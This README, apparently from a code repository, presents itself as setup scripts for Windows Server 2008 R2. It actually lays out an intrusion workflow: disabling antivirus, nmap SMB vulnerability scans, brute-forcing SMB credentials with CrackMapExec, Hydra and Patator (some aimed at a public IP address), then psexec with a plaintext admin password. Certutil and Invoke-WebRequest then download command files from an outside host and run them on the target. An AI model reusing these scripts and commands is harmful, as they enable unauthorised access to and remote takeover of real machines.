# Adjust Windows 2008 R2 Desktop

This Scripts are Made for Initial Adjustment of a Windows Server 2008 R2 Machine from Command Prompt.

## Requirements

#### On Source Computer 1

- Microsoft Windows 10+ Operation System
- Windows Managements Foundation 5.1
- Set all Hosts as Trusted ( Set-Item wsman:\localhost\client\trustedhosts * )
- All necessary .Net Frameworks and VCRedist Installed
- Python 3 (version >= 3.8, 3.12 recomended)
- pyftpdlib python module (optional) for ftp server
- Chocolatey Packet Manager;
- nmap.exe (port Scanner);
- Microsoft Sysinternals;
- Local or Virtual Network Access to Target Machine;

#### On Source Computer 2

- debian like Linux (Ubuntu, Kali, Astra, raspbian)
- nmap (port Scanner)
- python3 (version >= 3.8)
- impacket python module
- pyftpdlib python module (optional) for ftp server
- crackmapexec python module
- metasploit framework
- brutforce userlists and passwords lists

#### On Target Computer

- Pure Installation of the Microsoft Windows Server 2008 R2 Operation System;
- Internet Access;

### To be Sure

To Be Sure that Turn off your Antivirus on Source and Target Computer!

To Be Sure that Port 445/tcp is Opened on Target Computer (nmap).

## Check if the NetBIOS port is Enabled

- run a Command File:

```bash
@echo on
rem *******************************************************
rem nmap.netbios.discover.bat
rem This Script will Check if NetBIOS ports Open at
rem Windows Host %1 and Output an Info.
rem *******************************************************
@echo off

nmap.bat -Pn -p U:137,138,5357,T:21,22,23,135,137,139,445,3389,5357,5985,5986 -sU -sS -sV -oA %UserProfile%\Output\NB.Discover_%1 --script=banner,nbstat --max-rate 1280 %1
```

If port is Closed, try another Ports or Exit

```powershell
Test-NetConnection -ComputerName "192.168.252.47" -CommonTCPPort SMB -InformationLevel Detailed
```

These Commands must Run Successfully. If not You mast Turn on the Firewall Rules (see Run Remote Enable).

## Check SMB NetWork Details

- Run Follow Shell Files on a Linux Computer:

```bash
#!/bin/bash
# SmbPortScan.sh
# This Script Checks Windows Open TCP Ports for Single Hosts
#
# PARAMETER:  $1 is a Hosts
#

### Set Variables
#
OUTFILE=/home/vagrant/portscan/smb.disc_$(date +"%y-%m-%d_%H-%M-%S")_$1

ports=135,137,139,445,3389,5985,5986
echo $ports
nmap -p $ports -Pn -sV -A -O -n \
-oA $OUTFILE \
$1 \
--script=nbstat,\
smb-enum-domains,\
smb-enum-groups,\
smb-enum-processes,\
smb-enum-services,\
smb-enum-shares,\
smb-enum-sessions,\
smb-mbenum,\
smb-os-discovery,\
smb-protocols,\
smb-security-mode,\
smb-server-stats,\
smb-system-info,\
stuxnet-detect

#!/bin/bash
# SmbPortScan.sh
# This Script Checks Windows Open TCP Ports for Single Hosts
#
# PARAMETER:  $1 is a Hosts
#

### Set Variables
#
OUTFILE=/home/vagrant/portscan/smb.vuln_$(date +"%y-%m-%d_%H-%M-%S")_$1

ports=135,137,139,445,3389,5985,5986
echo $ports
nmap -p $ports -Pn -sV -A -O -n \
-oA $OUTFILE \
$1 \
--script=smb2-vuln-uptime,\
smb-double-pulsar-backdoor,\
smb-vuln-conficker,\
smb-vuln-cve2009-3103,\
smb-vuln-cve-2017-7494,\
smb-enum-shares,\
smb-vuln-ms06-025,\
smb-vuln-ms07-029,\
smb-vuln-ms08-067,\
smb-vuln-ms10-054,\
smb-vuln-ms10-061,\
smb-vuln-ms17-010,\
smb-vuln-regsvc-dos,\
smb-vuln-webexec

```

## Bruteforce Credentials

Brutforce Credentials are Made with some Methods:

- CrackMapExec:

```bash
#!/bin/bash
####
# cme-smb-test-mypass.sh
# This Script will BruteForce the host $1 of smb Protocols
# and will Put Credentials at Credentials Folder

### Set Variables
#
LOGINFILE=/home/vagrant/Dictionaries/users-my.txt
PASSFILE=/home/vagrant/Dictionaries/passwords-my.txt
HOST=192.168.252.47
OUTFILE=/home/vagrant/Credentials/cme_smb_$(date +"%y-%m-%d_%H-%M-%S")_$HOST.log.txt
OUTFILE1=/home/vagrant/Credentials/cme_smb_pwn_$(date +"%y-%m-%d_%H-%M-%S")_$HOST.log.txt

crackmapexec smb $HOST \
--continue-on-success \
-u $LOGINFILE -p $PASSFILE | \
# grep -v 'STATUS_INVALID_PARAMETER'
grep -v 'STATUS_LOGON_FAILURE' | \
tee $OUTFILE | \
grep -i '(Pwn3d!)' | \
tee $OUTFILE1
```

- Hydra

```bash
#!/bin/bash
####
# Hydra SMB My Passwords Test
#
# This Script will Find a Login/Password for My Machines
#
# PARAMETERS:   smb is a protocol
#               $1 is a Host Name or IP Address
####

#### Set a Variable
#
PROTOCOL=smb
HOST=192.168.252.47

LOGINFILE=/home/vagrant/Dictionaries/users-my.txt
PASSFILE=/home/vagrant/Dictionaries/passwords-my.txt
OUTFILE=/home/vagrant/Credentials/CredHydMy_$PROTOCOL_$(date +"%y-%m-%d_%H_%M_%S")_$HOST.log.txt

### Run Payload
#
hydra -L $LOGINFILE -P $PASSFILE \
-o $OUTFILE \
$PROTOCOL://$HOST

#!/bin/bash
####
# Hydra Samba My Passwords Test
#
# This Script will Find a Login/Password for My Machines
#
# PARAMETERS:   smb is a protocol
#               $1 is a Host Name or IP Address
####

#### Set a Variable
#
PROTOCOL=smb
# HOST=192.168.252.47
HOST=46.17.104.221

loginname=mssqlsr
LOGINFILE=/home/vagrant/Dictionaries/users-my.txt
PASSFILE=/home/vagrant/Dictionaries/passwords-my.txt
OUTFILE=/home/vagrant/Credentials/CredHydMy_$PROTOCOL_$(date +"%y-%m-%d_%H_%M_%S")_$HOST.log.txt

### Run Payload
#
# hydra -L $LOGINFILE -P $PASSFILE \
hydra -l $loginnname -P $PASSFILE \
-o $OUTFILE \
$PROTOCOL://$HOST

```

- patator

```bash
#!/bin/bash
####
# patator-smb-brute.my.sh
# This Script is Brute $1 host with Patator
# and Save Credentials at /home/vagrant/Credentials folder
####

### Set a Variables
#
LOGINFILE=/home/vagrant/Dictionaries/users-my.txt
PASSFILE=/home/vagrant/Dictionaries/passwords-my.txt
HOST=192.168.252.47
CREDFOLDER=/home/vagrant/Credentials
OUTFILE=CredPat_My_smb_$(date +"%y-%m-%d_%H-%M-%S")_$HOST.log.txt

### Run Payload
#
sudo patator smb_login \
host=$HOST user=FILE0 password=FILE1 \
0=$LOGINFILE 1=$PASSFILE \
-x ignore:fgrep='STATUS_ACCOUNT_LOCKED_OUT' \
-x ignore:fgrep='STATUS_LOGON_FAILURE' 2>&1 | \
tee $CREDFOLDER/$OUTFILE

#!/bin/bash
####
# patator-smb-brute.my.sh
# This Script is Brute $1 host with Patator, 
# Find None Guests Credentials
# and Save Credentials at /home/vagrant/Credentials folder
####

### Set a Variables
#
LOGINFILE=/home/vagrant/Dictionaries/users-my.txt
PASSFILE=/home/vagrant/Dictionaries/passwords-my.txt
APASS=I
HOST=192.168.252.47
# HOST=46.17.104.221
CREDFOLDER=/home/vagrant/Credentials
OUTFILE=CredPat_MyLogin_smb_$(date +"%y-%m-%d_%H-%M-%S")_$HOST.log.txt

### Run Payload
#
sudo patator smb_login \
host=$HOST user=FILE0 password=$APASS \
0=$LOGINFILE  2>&1  | \
grep -E 'STATUS_ACCOUNT_LOCKED_OUT|STATUS_LOGON_FAILURE' | \
tee $CREDFOLDER/$OUTFILE

#!/bin/bash
####
# patator-sambapass.brute.my.sh
# This Script is Brute HOST with Patator (Guest Access Enabled)
# and Save Credentials at /home/vagrant/Credentials folder
####

### Set a Variables
#
LOGINFILE=/home/vagrant/Dictionaries/users-my.txt
PASSFILE=/home/vagrant/Dictionaries/passwords-my.txt
loginname=mssqlsr
APASS=I
# HOST=192.168.252.47
HOST=46.17.104.221
CREDFOLDER=/home/vagrant/Credentials
OUTFILE=CredPat_MyPass_smb_$(date +"%y-%m-%d_%H-%M-%S")_$HOST.log.txt

### Run Payload
#
sudo patator smb_login \
host=$HOST user=$loginname password=FILE0 \
0=$PASSFILE \
-x ignore:fgrep='STATUS_LOGON_FAILURE' \
-x ignore:fgrep='STATUS_ACCOUNT_LOCKED_OUT' \
2>&1  | \
tee $CREDFOLDER/$OUTFILE

```

There is no an Universal Methods for Find a Credentials with SMB protocols at LAN or WAN, at Linux and Windows Computers, with or without Guest Access for SMB Share. Try all of this.

Remmember about DDoS Defence!

## Run Commands

### Template of command

psexec.exe \\192.168.252.47 /u Администратор /p 0A9s8d7F /i /h команда

The String "\\192.168.252.47" is a Computer Name, the String "Администратор" is a login, the String "0A9s8d7F" is a password, the String "C:\Users\Администратор\" is a Home Folder in this Page. Change this if any Difference is Found.

This Data (except of login and password) you can retrieve with nmap.exe command (See Instructions in the Internet).

You can retrieve the login and password in a Kali Linux Operation System with Brutforce Programs hydra, medusa, crackmapexec and patator.

#### 1. Run msft-KB4012598

```bash
psexec.exe \\192.168.252.47 /u Администратор /p 0A9s8d7F /i /h certutil.exe -urlcache -f http://file.netip4.ru:80/PROGS/Microsoft/KB4012598/WSH/msft-KB4012598-run-w61.cmd C:\Users\Администратор\msft-KB4012598-run-00.cmd

psexec.exe \\192.168.252.47 /u Администратор /p 0A9s8d7F /i /h cmd.exe /c C:\Users\Администратор\msft-KB4012598-run-00.cmd

psexec.exe \\192.168.252.47 /u Администратор /p 0A9s8d7F /i /h cscript.exe //NoLogo C:\Users\Администратор\KB4012598-Download.wsf
```

#### 2. Run Windows Adjust

```bash
psexec.exe \\192.168.252.47 /u Администратор /p 0A9s8d7F /i /h cmd /c c:\.BIN\smbshare\LNK\postinstall.001.cmd

psexec.exe \\192.168.252.47 /u Администратор /p 0A9s8d7F /i /h cmd /c c:\.BIN\smbshare\LNK\postinstall.002.cmd

psexec.exe \\192.168.252.47 /u Администратор /p 0A9s8d7F /i /h cmd /c c:\.BIN\smbshare\LNK\postinstall.003.cmd

( next for Windows 6.1 only )

psexec.exe \\192.168.252.47 /u Администратор /p 0A9s8d7F /i /h powershell.exe -NoLogo -NoProfile -Command "Set-ExecutionPolicy -ExecutionPolicy Unrestricted"

( next for Server only )

psexec.exe \\192.168.252.47 /u Администратор /p 0A9s8d7F /i /h cmd /c c:\.BIN\smbshare\LNK\postinstall.005.cmd

( next for all Windows )

psexec.exe \\192.168.252.47 /u Администратор /p 0A9s8d7F /i /h cmd /c c:\.BIN\smbshare\LNK\postinstall.006.cmd

psexec.exe \\192.168.252.47 /u Администратор /p 0A9s8d7F /i /h cmd /c c:\.BIN\smbshare\LNK\postinstall.007.b.cmd

psexec.exe \\192.168.252.47 /u Администратор /p 0A9s8d7F /i /h cmd /c c:\.BIN\smbshare\LNK\postinstall.008.cmd
```

#### 3. Run Remote Enable

```bash
psexec.exe \\192.168.252.47 /u Администратор /p 0A9s8d7F /i /h certutil.exe -urlcache -f http://file.netip4.ru:80/PROGS/NIT/RemoteOpen/nit-remoteenable-run-w61.cmd C:\Users\Администратор\nit-remoteenable-run-00.cmd

psexec.exe \\192.168.252.47 /u Администратор /p 0A9s8d7F /i /h cmd.exe /c C:\Users\Администратор\nit-remoteenable-run-00.cmd
```

##### 3.1. Run Remote Enable at WinRM

```powershell
# Add Remote Computer Credential
$cred3=Get-Credential

# Create New PSSession
$sess3=New-PSSession -ComputerName "192.168.252.46" -Credential $cred3 -Authentication Negotiate -Port 5985

## Run Remote Enable Commands ##
Invoke-Command -Session $sess3 -ScriptBlock { Invoke-WebRequest -Uri 'http://file.netip4.ru:80/PROGS/NIT/RemoteOpen/nit-remoteenable-run-pwsh.cmd' -OutFile 'C:\Users\Администратор\nit-remoteenable-run-00.cmd' }
Invoke-Command -Session $sess3 -ScriptBlock { cmd.exe /c C:\Users\Администратор\nit-remoteenable-run-00.cmd }

# Remove Session Variable if All is Done
Remove-PSSession $sess3
```
